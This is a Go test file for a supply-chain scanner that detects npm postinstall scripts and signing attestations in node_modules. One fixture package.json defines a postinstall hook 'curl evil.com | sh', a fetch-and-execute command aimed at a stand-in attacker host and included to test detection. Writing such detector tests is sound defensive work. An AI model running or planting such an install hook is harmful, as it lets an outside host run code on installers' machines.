package supplychain

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/sentari-dev/sentari-agent/scanner/deptree"
)

func TestDetectInNodeModules_postinstallScript(t *testing.T) {
	root := t.TempDir()
	pkgDir := filepath.Join(root, "evil-pkg")
	mustMkdir(t, pkgDir)
	mustWrite(t, filepath.Join(pkgDir, "package.json"), `{
		"name": "evil-pkg",
		"version": "1.0.0",
		"scripts": {"postinstall": "curl evil.com | sh"}
	}`)
	signals, err := DetectInNodeModules(root)
	if err != nil {
		t.Fatalf("detect failed: %v", err)
	}
	if len(signals) != 2 {
		t.Fatalf("expected 2 signals (postinstall + unsigned), got %d: %+v", len(signals), signals)
	}
	byType := map[string]deptree.SupplyChainSignal{}
	for _, s := range signals {
		byType[s.SignalType] = s
	}
	post, ok := byType["postinstall_script"]
	if !ok || post.Severity != "info" || post.PackageName != "evil-pkg" {
		t.Errorf("postinstall signal wrong: %+v", post)
	}
	if _, ok := byType["unsigned"]; !ok {
		t.Error("expected unsigned signal since attestation absent")
	}
}

func TestDetectInNodeModules_provenanceAttested(t *testing.T) {
	root := t.TempDir()
	pkgDir := filepath.Join(root, "good-pkg")
	mustMkdir(t, pkgDir)
	mustWrite(t, filepath.Join(pkgDir, "package.json"), `{
		"name": "good-pkg",
		"version": "2.0.0",
		"scripts": {"postinstall": "node prepare.js"}
	}`)
	mustWrite(t, filepath.Join(pkgDir, ".signature.json"), `{"signed":true}`)
	signals, err := DetectInNodeModules(root)
	if err != nil {
		t.Fatalf("detect failed: %v", err)
	}
	types := map[string]bool{}
	for _, s := range signals {
		types[s.SignalType] = true
	}
	if !types["postinstall_script"] || !types["provenance_attested"] {
		t.Errorf("expected postinstall + attested, got %v", types)
	}
	if types["unsigned"] {
		t.Error("unsigned should NOT be emitted when attestation present")
	}
}

func TestDetectInNodeModules_noScriptNoSignals(t *testing.T) {
	root := t.TempDir()
	pkgDir := filepath.Join(root, "boring-pkg")
	mustMkdir(t, pkgDir)
	mustWrite(t, filepath.Join(pkgDir, "package.json"), `{"name":"boring-pkg","version":"1.0.0"}`)
	signals, err := DetectInNodeModules(root)
	if err != nil {
		t.Fatalf("detect failed: %v", err)
	}
	if len(signals) != 0 {
		t.Errorf("expected no signals for boring pkg, got %+v", signals)
	}
}

func mustMkdir(t *testing.T, p string) {
	t.Helper()
	if err := os.MkdirAll(p, 0o755); err != nil {
		t.Fatal(err)
	}
}

func mustWrite(t *testing.T, p, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
